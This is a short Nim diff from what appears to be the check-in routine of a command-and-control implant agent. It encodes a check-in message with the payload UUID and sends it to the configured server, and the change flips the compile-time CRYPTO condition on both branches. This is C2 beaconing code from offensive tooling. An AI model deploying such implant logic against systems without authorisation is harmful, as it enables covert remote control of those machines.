@@ -62,10 +62,10 @@ proc checkIn: Future[bool] {.async.} =
     when not defined(release):
         echo "Checkin has been created: ", $(check)
 
-    let data = when not defined(CRYPTO): checkintojson(check) else: encode(curConfig.PayloadUUID & checkintojson(check), true)
+    let data = when defined(CRYPTO): checkintojson(check) else: encode(curConfig.PayloadUUID & checkintojson(check), true)
     try:
         # Send initial checkin and parse json response into JsonNode
-        let temp = when not defined(CRYPTO): await Fetch(curConfig, data, true) else: decode(await Fetch(curConfig, data, true))
+        let temp = when defined(CRYPTO): await Fetch(curConfig, data, true) else: decode(await Fetch(curConfig, data, true))
         when not defined(release):
             echo "decoded temp: ", temp
         var sanitisedString = parseJString(temp)
